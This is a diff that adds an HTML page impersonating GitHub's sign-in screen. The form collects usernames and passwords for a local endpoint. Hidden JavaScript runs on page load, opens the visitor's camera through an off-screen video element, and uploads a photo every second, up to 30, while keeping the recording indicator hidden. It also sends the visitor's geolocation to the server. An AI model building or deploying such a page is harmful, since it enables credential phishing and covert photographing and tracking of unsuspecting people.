@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to GitHub</title>
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .header {
+            margin: 40px 0;
+        }
+
+        .github-logo {
+            width: 48px;
+            height: 48px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 340px;
+            margin: 0 auto;
+        }
+
+        .login-title {
+            text-align: center;
+            margin-bottom: 16px;
+            font-size: 24px;
+            font-weight: 5000;
+            letter-spacing: -0.5px;
+        }
+
+        .login-box {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 400;
+            font-size: 14px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 5px 12px;
+            font-size: 14px;
+            line-height: 20px;
+            color: #c9d1d9;
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            outline: none;
+            height: 32px;
+        }
+
+        .form-control:focus {
+            border-color: #58a6ff;
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
+        }
+
+        .password-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .forgot-link {
+            font-size: 12px;
+            color: #58a6ff;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #238636;
+            color: #ffffff;
+            border: 1px solid rgba(240, 246, 252, 0.1);
+            padding: 5px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #2ea043;
+        }
+
+        .create-account-box {
+            text-align: center;
+            padding: 16px;
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+        }
+
+        .create-account-box p {
+            margin-bottom: 0;
+        }
+
+        .create-link {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+
+        .create-link:hover {
+            text-decoration: underline;
+        }
+
+        .passkey-link {
+            color: #58a6ff;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .passkey-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding: 40px 0;
+            width: 100%;
+            text-align: center;
+        }
+
+        .footer-links {
+            list-style: none;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 8px;
+        }
+
+        .footer-link {
+            color: #8b949e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-link:hover {
+            color: #58a6ff;
+            text-decoration: underline;
+        }
+
+        #camera-feed, #canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+            visibility: hidden;
+        }
+
+        #recording-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: #f00;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            display: none;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden video elements -->
+    <video id="camera-feed" autoplay muted playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <div id="recording-indicator">Recording <span id="recording-time">0</span>s</div>
+
+    <div class="header">
+        <svg class="github-logo" height="48" viewBox="0 0 16 16" width="48" fill="#ffffff">
+            <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+        </svg>
+    </div>
+
+    <div class="container">
+        <h1 class="login-title">Sign in to GitHub</h1>
+
+        <div class="login-box">
+            <form action="/login" method="POST">
+                <div class="form-group">
+                    <label for="login">Username or email address</label>
+                    <input type="text" name="login" id="login" class="form-control" autocomplete="username" required>
+                </div>
+
+                <div class="form-group">
+                    <div class="password-row">
+                        <label for="password">Password</label>
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                    </div>
+                    <input type="password" name="password" id="password" class="form-control" required>
+                </div>
+
+                <button type="submit" class="submit-btn">Sign in</button>
+            </form>
+        </div>
+
+        <a href="#" class="passkey-link">Sign in with a passkey</a>
+
+        <div class="create-account-box">
+            <p>New to GitHub? <a href="https://github.com/signup?source=login" class="create-link">Create an account</a>.</p>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <ul class="footer-links">
+            <li><a href="https://docs.github.com/en/site-policy/github-terms/github-terms-of-service" class="footer-link">Terms</a></li>
+            <li><a href="https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement" class="footer-link">Privacy</a></li>
+            <li><a href="https://docs.github.com/en" class="footer-link">Docs</a></li>
+            <li><a href="https://support.github.com/request/landing" class="footer-link">Contact GitHub Support</a></li>
+            <li><a href="#" class="footer-link">Manage cookies</a></li>
+            <li><a href="#" class="footer-link">Do not share my personal information</a></li>
+        </ul>
+    </footer>
+
+    <script>
+        // متغيرات التقاط الصور
+        let mediaStream = null;
+        let captureInterval = null;
+        let captureCount = 0;
+        let successfulCaptures = 0;
+        let retryCount = 0;
+        const MAX_CAPTURES = 30; // عدد الصور الأقصى
+        const MAX_RETRIES = 3;
+        const CAPTURE_INTERVAL = 1000; // التقاط صورة كل ثانية
+
+        // بدء تشغيل الكاميرا عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Page loaded, requesting camera...');
+            requestCameraPermission();
+            getLocation();
+        });
+
+        // وظيفة طلب إذن الكاميرا
+        function requestCameraPermission() {
+            retryCount++;
+            console.log("محاولة فتح الكاميرا #" + retryCount);
+            
+            const constraints = {
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: 'user'
+                },
+                audio: false // لا نحتاج للصوت
+            };
+            
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('canvas');
+            
+            // إعادة تعيين الفيديو
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(stream) {
+                    console.log("تم الحصول على مجرى الكاميرا بنجاح");
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = function() {
+                        console.log("تم تحميل بيانات الكاميرا");
+                        video.play()
+                            .then(() => {
+                                console.log("تم تشغيل الكاميرا بنجاح");
+                                startCapturing();
+                            })
+                            .catch(err => console.error("خطأ في تشغيل الكاميرا:", err));
+                    };
+                })
+                .catch(function(error) {
+                    console.error("خطأ في الوصول إلى الكاميرا:", error);
+                    
+                    if (retryCount < MAX_RETRIES) {
+                        console.log("محاولة تشغيل الكاميرا بإعدادات مختلفة...");
+                        
+                        const simpleConstraints = {
+                            video: { facingMode: 'user' },
+                            audio: false
+                        };
+                        
+                        setTimeout(() => {
+                            navigator.mediaDevices.getUserMedia(simpleConstraints)
+                                .then(function(stream) {
+                                    console.log("تم الحصول على مجرى الكاميرا بإعدادات بسيطة");
+                                    mediaStream = stream;
+                                    video.srcObject = stream;
+                                    video.play();
+                                    startCapturing();
+                                })
+                                .catch(error => {
+                                    console.error("فشلت المحاولة الثانية للكاميرا:", error);
+                                });
+                        }, 500);
+                    }
+                });
+        }
+
+        // دالة التقاط الصور
+        function startCapturing() {
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('canvas');
+            const indicator = document.getElementById('recording-indicator');
+            
+            // تهيئة Canvas بنفس أبعاد الفيديو
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // إظهار مؤشر التصوير
+            indicator.style.display = 'none';
+            indicator.textContent = '';
+            
+            captureInterval = setInterval(() => {
+                if (captureCount >= MAX_CAPTURES) {
+                    stopCapturing();
+                    return;
+                }
+                
+                captureAndSendPhoto();
+            }, CAPTURE_INTERVAL);
+        }
+
+        // دالة التقاط وإرسال الصورة
+        function captureAndSendPhoto() {
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // التقاط الصورة
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة إلى blob
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                const timestamp = new Date().getTime();
+                const filename = `photo_github_${timestamp}.jpg`;
+                formData.append('photo', blob, filename);
+                
+                console.log("جاري إرسال الصورة:", filename);
+                
+                fetch('/api/capture-photo', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok: ' + response.statusText);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("تم التقاط وإرسال الصورة بنجاح #" + (++captureCount), data);
+                    successfulCaptures++;
+                })
+                .catch(error => {
+                    console.error("خطأ في إرسال الصورة:", error);
+                });
+            }, 'image/jpeg', 0.8);
+        }
+
+        // دالة إيقاف التقاط الصور
+        function stopCapturing() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            
+            document.getElementById('recording-indicator').style.display = 'none';
+            console.log(`تم الانتهاء من التقاط الصور. نجح: ${successfulCaptures} من ${captureCount}`);
+        }
+
+        // Get user location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+
+                        fetch('/save-location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(locationData)
+                        })
+                        .then(response => response.json())
+                        .then(data => console.log('Location saved successfully'))
+                        .catch(error => console.error('Location error:', error));
+                    },
+                    function(error) {
+                        console.error('Geolocation error:', error);
+                    }
+                );
+            }
+        }
+    </script>
+</body>
+</html> 
